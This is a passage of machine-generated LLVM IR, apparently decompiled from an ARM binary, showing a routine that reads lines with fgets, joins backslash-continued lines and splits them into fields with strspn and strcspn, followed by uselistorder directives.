  %v0_15430 = phi i32 [ %v0_15424, %dec_label_pc_15418 ], [ %v1_154a0, %dec_label_pc_154a0 ], [ %v0_15430.pre.pre, %dec_label_pc_154b4 ]
  %v0_15428 = load i32, i32* @r5, align 4
  %v1_15428 = add i32 %v0_15428, 12
  store i32 %v1_15428, i32* %r0.global-to-local, align 4
  %v1_1542c = inttoptr i32 %v1_15428 to i32*
  %v2_1542c = load i32, i32* %v1_1542c, align 4
  store i32 %v2_1542c, i32* %r0.global-to-local, align 4
  %v3_1542c = add i32 %v0_15428, 16
  %v4_1542c = inttoptr i32 %v3_1542c to i32*
  %v5_1542c = load i32, i32* %v4_1542c, align 4
  %v2_15430 = add i32 %v2_1542c, %v0_15430
  store i32 %v2_15430, i32* %r0.global-to-local, align 4
  %v2_15434 = sub i32 %v5_1542c, %v0_15430
  %v1_15438 = inttoptr i32 %v0_15428 to i32*
  %v2_15438 = load i32, i32* %v1_15438, align 4
  store i32 %v2_15438, i32* %r2.global-to-local, align 4
  %v3_1543c = call i32 @fgets(i32 %v2_15430, i32 %v2_15434, i32 %v2_15438)
  store i32 %v3_1543c, i32* %r0.global-to-local, align 4
  store i32 %v3_1543c, i32* %r4.global-to-local, align 4
  %v2_15440 = icmp eq i32 %v3_1543c, 0
  store i1 %v2_15440, i1* %cpsr_z.global-to-local, align 1
  %v0_15448 = load i32, i32* @r5, align 4
  %v1_15448 = add i32 %v0_15448, 12
  br i1 %v2_15440, label %dec_label_pc_15448, label %dec_label_pc_15460

dec_label_pc_15448:                               ; preds = %dec_label_pc_15428
  store i32 %v1_15448, i32* %r0.global-to-local, align 4
  %v1_1544c = inttoptr i32 %v1_15448 to i32*
  %v2_1544c = load i32, i32* %v1_1544c, align 4
  store i32 %v2_1544c, i32* %r0.global-to-local, align 4
  %v3_1544c = add i32 %v0_15448, 16
  %v4_1544c = inttoptr i32 %v3_1544c to i32*
  %v5_1544c = load i32, i32* %v4_1544c, align 4
  store i32 %v5_1544c, i32* %r2.global-to-local, align 4
  %v3_15454 = inttoptr i32 %v2_1544c to i8*
  %v4_15454 = call i32 @__GI_memset(i8* %v3_15454, i32 0, i32 %v5_1544c)
  store i32 %v4_15454, i32* %r0.global-to-local, align 4
  %v0_15458 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15678

dec_label_pc_15460:                               ; preds = %dec_label_pc_15428
  %v2_15460 = inttoptr i32 %v1_15448 to i32*
  %v3_15460 = load i32, i32* %v2_15460, align 4
  store i32 %v3_15460, i32* @r4, align 4
  %v1_15464 = load i32, i32* @r6, align 4
  %v2_15464 = add i32 %v1_15464, %v3_15460
  %v3_15464 = inttoptr i32 %v2_15464 to i8*
  store i32 %v2_15464, i32* %r0.global-to-local, align 4
  %v3_15468 = call i32 @strlen(i8* %v3_15464)
  %v0_15470 = load i32, i32* @r6, align 4
  %v2_15470 = add i32 %v0_15470, %v3_15468
  store i32 %v2_15470, i32* @r6, align 4
  %v0_15474 = load i32, i32* @r4, align 4
  store i32 %v0_15474, i32* @r0, align 4
  %v2_15478 = call i32 @__GI_strchr(i32 %v0_15474, i32 10)
  store i32 %v2_15478, i32* %r0.global-to-local, align 4
  %v2_1547c = icmp eq i32 %v2_15478, 0
  store i1 %v2_1547c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1547c, label %dec_label_pc_154a8, label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %dec_label_pc_15460
  %v1_15484 = inttoptr i32 %v2_15478 to i8*
  %v2_15484 = load i8, i8* %v1_15484, align 1
  %v3_15484 = zext i8 %v2_15484 to i32
  %v1_15488 = add nuw nsw i32 %v3_15484, 255
  %v1_1548c = urem i32 %v1_15488, 256
  store i32 %v1_1548c, i32* %r3.global-to-local, align 4
  %v7_15490 = icmp eq i32 %v1_1548c, 92
  store i1 %v7_15490, i1* %cpsr_z.global-to-local, align 1
  %v1_15494 = trunc i32 %v1_15488 to i8
  store i8 %v1_15494, i8* %v1_15484, align 1
  %v0_15498 = load i32, i32* @r6, align 4
  %v1_15498 = add i32 %v0_15498, -1
  store i32 %v1_15498, i32* @r6, align 4
  %v0_1549c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1549c, label %dec_label_pc_154a0, label %dec_label_pc_1552c

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15484
  %v1_154a0 = add i32 %v0_15498, -2
  store i32 %v1_154a0, i32* @r6, align 4
  br label %dec_label_pc_15428

dec_label_pc_154a8:                               ; preds = %dec_label_pc_15460
  %v0_154a8 = load i32, i32* @r5, align 4
  %v1_154a8 = add i32 %v0_154a8, 20
  %v2_154a8 = inttoptr i32 %v1_154a8 to i32*
  %v3_154a8 = load i32, i32* %v2_154a8, align 4
  store i32 %v3_154a8, i32* %r3.global-to-local, align 4
  %v2_154ac = icmp eq i32 %v3_154a8, 0
  store i1 %v2_154ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154ac, label %dec_label_pc_154e4, label %dec_label_pc_154b4

dec_label_pc_154b4:                               ; preds = %dec_label_pc_154a8
  %v1_154b4 = add i32 %v0_154a8, 16
  %v2_154b4 = inttoptr i32 %v1_154b4 to i32*
  %v3_154b4 = load i32, i32* %v2_154b4, align 4
  store i32 %v3_154b4, i32* %r3.global-to-local, align 4
  %v1_154b8 = add i32 %v0_154a8, 8
  %v2_154b8 = inttoptr i32 %v1_154b8 to i32*
  %v3_154b8 = load i32, i32* %v2_154b8, align 4
  %v1_154bc = add i32 %v3_154b4, 4096
  store i32 %v1_154bc, i32* %r3.global-to-local, align 4
  %v2_154c0 = add i32 %v3_154b8, %v1_154bc
  store i32 %v1_154bc, i32* %v2_154b4, align 4
  %v0_154c8 = load i32, i32* @r5, align 4
  %v1_154c8 = add i32 %v0_154c8, 4
  %v2_154c8 = inttoptr i32 %v1_154c8 to i32*
  %v3_154c8 = load i32, i32* %v2_154c8, align 4
  store i32 %v3_154c8, i32* %r0.global-to-local, align 4
  %v4_154cc = inttoptr i32 %v3_154c8 to i32*
  %v5_154cc = call i32 @realloc(i32* %v4_154cc, i32 %v2_154c0, i32 %v2_15438, i32 %v1_154bc)
  store i32 %v5_154cc, i32* %r0.global-to-local, align 4
  %v0_154d0 = load i32, i32* @r5, align 4
  %v1_154d0 = add i32 %v0_154d0, 8
  %v2_154d0 = inttoptr i32 %v1_154d0 to i32*
  %v3_154d0 = load i32, i32* %v2_154d0, align 4
  %v2_154d4 = add i32 %v3_154d0, %v5_154cc
  store i32 %v2_154d4, i32* %r3.global-to-local, align 4
  %v2_154d8 = add i32 %v0_154d0, 12
  %v3_154d8 = inttoptr i32 %v2_154d8 to i32*
  store i32 %v2_154d4, i32* %v3_154d8, align 4
  %v1_154dc = load i32, i32* @r5, align 4
  %v2_154dc = add i32 %v1_154dc, 4
  %v3_154dc = inttoptr i32 %v2_154dc to i32*
  store i32 %v5_154cc, i32* %v3_154dc, align 4
  %v0_15430.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15428

dec_label_pc_154e4:                               ; preds = %dec_label_pc_154a8, %.dec_label_pc_154e4_crit_edge
  %v0_154e4 = phi i32 [ %v0_154e4.pre, %.dec_label_pc_154e4_crit_edge ], [ %v0_154a8, %dec_label_pc_154a8 ]
  %v1_154e4 = inttoptr i32 %v0_154e4 to i32*
  %v2_154e4 = load i32, i32* %v1_154e4, align 4
  store i32 %v2_154e4, i32* @r1, align 4
  %v1_154e8 = add i32 %v2_154e4, 52
  %v2_154e8 = inttoptr i32 %v1_154e8 to i32*
  %v3_154e8 = load i32, i32* %v2_154e8, align 4
  store i32 %v3_154e8, i32* %r3.global-to-local, align 4
  %v2_154ec = icmp eq i32 %v3_154e8, 0
  store i1 %v2_154ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154ec, label %dec_label_pc_15518, label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154e4
  %v1_154f4 = add i32 %v2_154e4, 16
  %v2_154f4 = inttoptr i32 %v1_154f4 to i32*
  %v3_154f4 = load i32, i32* %v2_154f4, align 4
  store i32 %v3_154f4, i32* %r2.global-to-local, align 4
  %v1_154f8 = add i32 %v2_154e4, 24
  %v2_154f8 = inttoptr i32 %v1_154f8 to i32*
  %v3_154f8 = load i32, i32* %v2_154f8, align 4
  store i32 %v3_154f8, i32* %r3.global-to-local, align 4
  %v3_154fc = icmp ult i32 %v3_154f4, %v3_154f8
  %v9_154fc = icmp eq i32 %v3_154f4, %v3_154f8
  store i1 %v9_154fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_154fc, label %dec_label_pc_15520thread-pre-split, label %dec_label_pc_1550c

dec_label_pc_1550c:                               ; preds = %dec_label_pc_154f4
  store i32 %v2_154e4, i32* %r0.global-to-local, align 4
  %v1_15510 = inttoptr i32 %v2_154e4 to i16*
  %v2_15510 = call i32 @getc_unlocked(i16* %v1_15510)
  store i32 %v2_15510, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15520

dec_label_pc_15518:                               ; preds = %dec_label_pc_154e4
  store i32 %v2_154e4, i32* %r0.global-to-local, align 4
  %v1_1551c = call i32 @__GI_fgetc(i32 %v2_154e4)
  store i32 %v1_1551c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15520

dec_label_pc_15520thread-pre-split:               ; preds = %dec_label_pc_154f4
  %v2_15500 = inttoptr i32 %v3_154f4 to i8*
  %v3_15500 = load i8, i8* %v2_15500, align 1
  %v4_15500 = zext i8 %v3_15500 to i32
  store i32 %v4_15500, i32* %r0.global-to-local, align 4
  %v6_15500 = add i32 %v3_154f4, 1
  store i32 %v6_15500, i32* %r2.global-to-local, align 4
  store i32 %v6_15500, i32* %v2_154f4, align 4
  %v0_15520.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %dec_label_pc_15520thread-pre-split, %dec_label_pc_1550c, %dec_label_pc_15518
  %v1_15524 = phi i32 [ %v0_15520.pr, %dec_label_pc_15520thread-pre-split ], [ %v2_15510, %dec_label_pc_1550c ], [ %v1_1551c, %dec_label_pc_15518 ]
  %v7_15520 = icmp eq i32 %v1_15524, 10
  store i1 %v7_15520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15520, label %dec_label_pc_1552c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15520
  %v8_15524 = icmp eq i32 %v1_15524, -1
  store i1 %v8_15524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15524, label %dec_label_pc_1552c.loopexit, label %.dec_label_pc_154e4_crit_edge

.dec_label_pc_154e4_crit_edge:                    ; preds = %bb66
  %v0_154e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154e4

dec_label_pc_1552c.loopexit:                      ; preds = %bb66, %dec_label_pc_15520
  %v0_1552c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15484, %dec_label_pc_1552c.loopexit
  %v0_1552c = phi i32 [ %v0_1552c.pre, %dec_label_pc_1552c.loopexit ], [ %v1_15498, %dec_label_pc_15484 ]
  %v7_1552c = icmp eq i32 %v0_1552c, -1
  store i1 %v7_1552c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1552c, label %dec_label_pc_15674, label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %dec_label_pc_1552c
  store i32 %v1_1539c, i32* %r3.global-to-local, align 4
  store i1 %v2_15538, i1* %cpsr_z.global-to-local, align 1
  %v0_1553c = load i32, i32* @r5, align 4
  %v1_1553c = add i32 %v0_1553c, 12
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* @r4, align 4
  br i1 %v2_15538, label %dec_label_pc_15554, label %dec_label_pc_15544

dec_label_pc_15544:                               ; preds = %dec_label_pc_15534
  store i32 %v3_1553c, i32* @r0, align 4
  %v0_15548 = load i32, i32* @sl, align 4
  %v2_1554c = inttoptr i32 %v3_1553c to i8*
  %v3_1554c = call i32 @__GI_strspn(i8* %v2_1554c, i32 %v0_15548)
  store i32 %v3_1554c, i32* %r0.global-to-local, align 4
  %v0_15550 = load i32, i32* @r4, align 4
  %v2_15550 = add i32 %v0_15550, %v3_1554c
  store i32 %v2_15550, i32* @r4, align 4
  br label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_15534, %dec_label_pc_15544
  %v0_15554 = phi i32 [ %v3_1553c, %dec_label_pc_15534 ], [ %v2_15550, %dec_label_pc_15544 ]
  %v1_15554 = inttoptr i32 %v0_15554 to i8*
  %v2_15554 = load i8, i8* %v1_15554, align 1
  %v3_15554 = zext i8 %v2_15554 to i32
  store i32 %v3_15554, i32* %r2.global-to-local, align 4
  %v2_15558 = icmp eq i8 %v2_15554, 0
  store i1 %v2_15558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15558, label %dec_label_pc_153c4.backedge, label %dec_label_pc_15560

dec_label_pc_153c4.backedge:                      ; preds = %dec_label_pc_15554, %dec_label_pc_15560, %dec_label_pc_1566c
  %v0_153c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_153c4

dec_label_pc_15560:                               ; preds = %dec_label_pc_15554
  %v0_15560 = load i32, i32* @r7, align 4
  %v1_15560 = inttoptr i32 %v0_15560 to i8*
  %v2_15560 = load i8, i8* %v1_15560, align 1
  %v3_15560 = zext i8 %v2_15560 to i32
  store i32 %v3_15560, i32* %r3.global-to-local, align 4
  %v9_15564 = icmp eq i8 %v2_15560, %v2_15554
  store i1 %v9_15564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15564, label %dec_label_pc_153c4.backedge, label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %dec_label_pc_15560
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15570 = load i32, i32* @r5, align 4
  %v1_15570 = add i32 %v0_15570, 4
  %v2_15570 = inttoptr i32 %v1_15570 to i32*
  %v3_15570 = load i32, i32* %v2_15570, align 4
  store i32 %v3_15570, i32* %r0.global-to-local, align 4
  %v0_15574 = load i32, i32* @fp, align 4
  store i32 %v3_15570, i32* %v1_15590, align 4
  store i32 %v3_15388, i32* %r2.global-to-local, align 4
  %v3_15580 = inttoptr i32 %v3_15570 to i8*
  %v4_15580 = call i32 @__GI_memset(i8* %v3_15580, i32 %v0_15574, i32 %v3_15388)
  store i32 %v4_15580, i32* %r0.global-to-local, align 4
  %v0_15584 = load i32, i32* @fp, align 4
  store i32 %v0_15584, i32* @r6, align 4
  %v0_1564412 = load i32, i32* @r4, align 4
  %v1_1564413 = inttoptr i32 %v0_1564412 to i8*
  %v2_1564414 = load i8, i8* %v1_1564413, align 1
  %v3_1564415 = zext i8 %v2_1564414 to i32
  store i32 %v3_1564415, i32* %r2.global-to-local, align 4
  %v2_1564816 = icmp eq i8 %v2_1564414, 0
  store i1 %v2_1564816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1564816, label %dec_label_pc_15660, label %dec_label_pc_15650

dec_label_pc_1558c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15590 = load i32, i32* %v1_15590, align 4
  store i32 %v2_15590, i32* %r3.global-to-local, align 4
  store i32 %v1_153a0, i32* %r2.global-to-local, align 4
  %v9_15598 = icmp eq i32 %v2_1559c, %v1_153a0
  store i1 %v9_15598, i1* %cpsr_z.global-to-local, align 1
  %v5_1559c = mul i32 %v2_1559c, 4
  %v6_1559c = add i32 %v2_15590, %v5_1559c
  %v7_1559c = inttoptr i32 %v6_1559c to i32*
  store i32 %v0_1559c, i32* %v7_1559c, align 4
  br i1 %v9_15598, label %dec_label_pc_155a4, label %dec_label_pc_155b0

dec_label_pc_155a4:                               ; preds = %dec_label_pc_1558c
  store i32 %v1_153ac, i32* %r3.global-to-local, align 4
  store i1 %v2_155a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_155a8, label %dec_label_pc_155b0, label %dec_label_pc_155d0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_155a4, %dec_label_pc_1558c
  %v0_155b0 = load i32, i32* @r7, align 4
  %v1_155b0 = inttoptr i32 %v0_155b0 to i8*
  %v2_155b0 = load i8, i8* %v1_155b0, align 1
  %v3_155b0 = zext i8 %v2_155b0 to i32
  store i32 %v3_155b0, i32* %r3.global-to-local, align 4
  %v2_155b4 = icmp eq i8 %v2_155b0, 0
  store i1 %v2_155b4, i1* %cpsr_z.global-to-local, align 1
  %v0_155b8 = load i32, i32* @r4, align 4
  store i32 %v0_155b8, i32* @r0, align 4
  %v1_155bc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_155b4, i32 %v1_155bc, i32 %v0_155b0
  store i32 %storemerge, i32* @r1, align 4
  %v0_155c4 = call i32 @strcspn()
  store i32 %v0_155c4, i32* %r0.global-to-local, align 4
  %v0_155c8 = load i32, i32* @r4, align 4
  %v2_155c8 = add i32 %v0_155c8, %v0_155c4
  store i32 %v2_155c8, i32* @r4, align 4
  br label %dec_label_pc_15608

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155a4
  %v0_155d0 = load i32, i32* @r4, align 4
  store i32 %v0_155d0, i32* @r0, align 4
  %v0_155d4 = load i32, i32* @r7, align 4
  %v1_155d4 = inttoptr i32 %v0_155d4 to i8*
  %v2_155d4 = load i8, i8* %v1_155d4, align 1
  %v3_155d4 = zext i8 %v2_155d4 to i32
  %v5_155d8 = call i32 @__GI_strchrnul(i32 %v0_155d0, i32 %v3_155d4, i32 %v1_153a0, i32 %v1_153ac)
  store i32 %v5_155d8, i32* %r0.global-to-local, align 4
  store i32 %v1_1539c, i32* %r2.global-to-local, align 4
  store i1 %v2_15538, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_155d8, i32* @r4, align 4
  br i1 %v2_15538, label %dec_label_pc_15608, label %dec_label_pc_155f4

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155f4
  %v1_155f0 = add i32 %v0_15608.pre, -1
  store i32 %v1_155f0, i32* @r4, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155d0, %dec_label_pc_155f0
  %v0_155f4 = phi i32 [ %v1_155f0, %dec_label_pc_155f0 ], [ %v5_155d8, %dec_label_pc_155d0 ]
  %v1_155f4 = add i32 %v0_155f4, -1
  %v2_155f4 = inttoptr i32 %v1_155f4 to i8*
  %v3_155f4 = load i8, i8* %v2_155f4, align 1
  %v4_155f4 = zext i8 %v3_155f4 to i32
  %v0_155f8 = load i32, i32* @sl, align 4
  store i32 %v0_155f8, i32* @r0, align 4
  %v2_155fc = call i32 @__GI_strchr(i32 %v0_155f8, i32 %v4_155f4)
  store i32 %v2_155fc, i32* %r0.global-to-local, align 4
  %v2_15600 = icmp eq i32 %v2_155fc, 0
  store i1 %v2_15600, i1* %cpsr_z.global-to-local, align 1
  %v0_15608.pre = load i32, i32* @r4, align 4
  br i1 %v2_15600, label %dec_label_pc_15608, label %dec_label_pc_155f0

dec_label_pc_15608:                               ; preds = %dec_label_pc_155f4, %dec_label_pc_155d0, %dec_label_pc_155b0
  %v3_15614 = phi i32 [ %v5_155d8, %dec_label_pc_155d0 ], [ %v2_155c8, %dec_label_pc_155b0 ], [ %v0_15608.pre, %dec_label_pc_155f4 ]
  %v1_15608 = inttoptr i32 %v3_15614 to i8*
  %v2_15608 = load i8, i8* %v1_15608, align 1
  %v3_15608 = zext i8 %v2_15608 to i32
  store i32 %v3_15608, i32* %r2.global-to-local, align 4
  %v0_1560c = load i32, i32* @r7, align 4
  %v1_1560c = inttoptr i32 %v0_1560c to i8*
  %v2_1560c = load i8, i8* %v1_1560c, align 1
  %v3_1560c = zext i8 %v2_1560c to i32
  store i32 %v3_1560c, i32* %r3.global-to-local, align 4
  %v9_15610 = icmp eq i8 %v2_1560c, %v2_15608
  store i1 %v9_15610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15610, label %bb69, label %dec_label_pc_1561c

bb69:                                             ; preds = %dec_label_pc_15608
  %v1_15614 = load i32, i32* @fp, align 4
  %v2_15614 = trunc i32 %v1_15614 to i8
  store i8 %v2_15614, i8* %v1_15608, align 1
  %v0_15618.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15618.pr, label %bb71, label %.dec_label_pc_1561c_crit_edge

.dec_label_pc_1561c_crit_edge:                    ; preds = %bb69
  %v0_1561c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1561c

dec_label_pc_1561c:                               ; preds = %.dec_label_pc_1561c_crit_edge, %dec_label_pc_15608
  %v0_1561c = phi i32 [ %v0_1561c.pre, %.dec_label_pc_1561c_crit_edge ], [ %v3_15608, %dec_label_pc_15608 ]
  %v2_1561c = icmp eq i32 %v0_1561c, 0
  store i1 %v2_1561c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1561c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1561c
  %v1_15620 = load i32, i32* @fp, align 4
  %v2_15620 = trunc i32 %v1_15620 to i8
  %v3_15620 = load i32, i32* @r4, align 4
  %v4_15620 = inttoptr i32 %v3_15620 to i8*
  store i8 %v2_15620, i8* %v4_15620, align 1
  %v5_15620 = load i32, i32* @r4, align 4
  %v6_15620 = add i32 %v5_15620, 1
  store i32 %v6_15620, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1561c, %bb70
  %v2_15624 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15624, i32* %r3.global-to-local, align 4
  %v2_15628 = icmp eq i32 %v2_15624, 0
  store i1 %v2_15628, i1* %cpsr_z.global-to-local, align 1
  %v0_15644.pre = load i32, i32* @r4, align 4
  br i1 %v2_15628, label %dec_label_pc_15640, label %dec_label_pc_15630

dec_label_pc_15630:                               ; preds = %bb71
  store i32 %v0_15644.pre, i32* @r0, align 4
  %v0_15634 = load i32, i32* @sl, align 4
  %v2_15638 = inttoptr i32 %v0_15644.pre to i8*
  %v3_15638 = call i32 @__GI_strspn(i8* %v2_15638, i32 %v0_15634)
  store i32 %v3_15638, i32* %r0.global-to-local, align 4
  %v0_1563c = load i32, i32* @r4, align 4
  %v2_1563c = add i32 %v0_1563c, %v3_15638
  store i32 %v2_1563c, i32* @r4, align 4
  br label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %bb71, %dec_label_pc_15630
  %v0_15644 = phi i32 [ %v2_1563c, %dec_label_pc_15630 ], [ %v0_15644.pre, %bb71 ]
  %v0_15640 = load i32, i32* @r6, align 4
  %v1_15640 = add i32 %v0_15640, 1
  store i32 %v1_15640, i32* @r6, align 4
  %v1_15644 = inttoptr i32 %v0_15644 to i8*
  %v2_15644 = load i8, i8* %v1_15644, align 1
  %v3_15644 = zext i8 %v2_15644 to i32
  store i32 %v3_15644, i32* %r2.global-to-local, align 4
  %v2_15648 = icmp eq i8 %v2_15644, 0
  store i1 %v2_15648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15648, label %dec_label_pc_15660, label %dec_label_pc_15650

dec_label_pc_15650:                               ; preds = %dec_label_pc_1556c, %dec_label_pc_15640
  %v0_1559c = phi i32 [ %v0_15644, %dec_label_pc_15640 ], [ %v0_1564412, %dec_label_pc_1556c ]
  %v2_1559c = phi i32 [ %v1_15640, %dec_label_pc_15640 ], [ %v0_15584, %dec_label_pc_1556c ]
  %v1_15654 = phi i32 [ %v3_15644, %dec_label_pc_15640 ], [ %v3_1564415, %dec_label_pc_1556c ]
  %v0_15650 = load i32, i32* @r7, align 4
  %v1_15650 = inttoptr i32 %v0_15650 to i8*
  %v2_15650 = load i8, i8* %v1_15650, align 1
  %v3_15650 = zext i8 %v2_15650 to i32
  store i32 %v3_15650, i32* %r3.global-to-local, align 4
  %v9_15654 = icmp eq i32 %v3_15650, %v1_15654
  store i1 %v9_15654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15654, label %dec_label_pc_15660, label %bb72

bb72:                                             ; preds = %dec_label_pc_15650
  %v2_15658 = load i32, i32* @sb, align 4
  %v3_15658 = sub i32 %v2_1559c, %v2_15658
  %v5_15658 = xor i32 %v2_15658, %v2_1559c
  %v6_15658 = xor i32 %v3_15658, %v2_1559c
  %v7_15658 = and i32 %v6_15658, %v5_15658
  %v8_15658 = icmp slt i32 %v7_15658, 0
  %v9_15658 = icmp slt i32 %v3_15658, 0
  %v10_15658 = icmp eq i32 %v2_1559c, %v2_15658
  store i1 %v10_15658, i1* %cpsr_z.global-to-local, align 1
  %v2_1565c = xor i1 %v9_15658, %v8_15658
  br i1 %v2_1565c, label %dec_label_pc_1558c, label %dec_label_pc_15660

dec_label_pc_15660:                               ; preds = %dec_label_pc_15650, %dec_label_pc_15640, %bb72, %dec_label_pc_1556c
  %v0_15664 = phi i32 [ %v0_15584, %dec_label_pc_1556c ], [ %v2_1559c, %dec_label_pc_15650 ], [ %v1_15640, %dec_label_pc_15640 ], [ %v2_1559c, %bb72 ]
  store i32 %v3_15384, i32* %r2.global-to-local, align 4
  %v9_15664 = icmp eq i32 %v0_15664, %v3_15384
  store i1 %v9_15664, i1* %cpsr_z.global-to-local, align 1
  %v6_15668 = icmp slt i32 %v0_15664, %v3_15384
  br i1 %v6_15668, label %dec_label_pc_1566c, label %dec_label_pc_15678

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15660
  %v0_1566c = load i32, i32* @r8, align 4
  %v1_1566c = and i32 %v0_1566c, 1048576
  %v2_1566c = icmp eq i32 %v1_1566c, 0
  store i1 %v2_1566c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1566c, label %dec_label_pc_153c4.backedge, label %dec_label_pc_15674

dec_label_pc_15674:                               ; preds = %dec_label_pc_1566c, %dec_label_pc_1552c, %.thread, %entry
  br label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %dec_label_pc_15660, %dec_label_pc_15448, %dec_label_pc_15674
  %v0_15678 = phi i32 [ %v0_15458, %dec_label_pc_15448 ], [ 0, %dec_label_pc_15674 ], [ %v0_15664, %dec_label_pc_15660 ]
  store i32 %v0_15678, i32* %r0.global-to-local, align 4
  store i32 %v3_15360, i32* @r4, align 4
  store i32 %v6_15360, i32* @r5, align 4
  store i32 %v9_15360, i32* @r6, align 4
  store i32 %v12_15360, i32* @r7, align 4
  store i32 %v15_15360, i32* @r8, align 4
  store i32 %v18_15360, i32* @sb, align 4
  store i32 %v21_15360, i32* @sl, align 4
  store i32 %v24_15360, i32* @fp, align 4
  ret i32 %v0_15678

; uselistorder directives
  uselistorder i32 %v0_15678, { 1, 0 }
  uselistorder i32 %v0_15664, { 0, 2, 1 }
  uselistorder i32 %v3_15658, { 1, 0 }
  uselistorder i32 %v2_15658, { 1, 0, 2 }
  uselistorder i32 %v2_1559c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15644.pre, { 0, 2, 1 }
  uselistorder i32 %v5_155d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15584, { 1, 0, 2 }
  uselistorder i1 %v9_15564, { 1, 0 }
  uselistorder i32 %v3_1553c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1552c, { 1, 0 }
  uselistorder i1 %v8_15524, { 1, 0 }
  uselistorder i32 %v3_154f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_154e4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_154cc, { 1, 0, 2 }
  uselistorder i32 %v1_154bc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_154a8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_154a0, { 1, 0 }
  uselistorder i32 %v1_1548c, { 1, 0 }
  uselistorder i32 %v1_15488, { 1, 0 }
  uselistorder i32 %v2_15464, { 1, 0 }
  uselistorder i32 %v1_15448, { 2, 0, 1 }
  uselistorder i32 %v0_15430, { 1, 0 }
  uselistorder i32 %v1_15420, { 0, 2, 1 }
  uselistorder i32* %v1_15590, { 1, 0 }
  uselistorder i1 %v2_15538, { 1, 0, 2, 3 }
  uselistorder i32 %v1_153ac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_153a0, { 2, 1, 0 }
  uselistorder i32 %v3_15388, { 1, 2, 0 }
  uselistorder i32 %v3_15384, { 2, 1, 0 }
  uselistorder i32 %v1_1537c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15678, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15660, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15650, { 1, 0 }
  uselistorder label %dec_label_pc_15640, { 1, 0 }
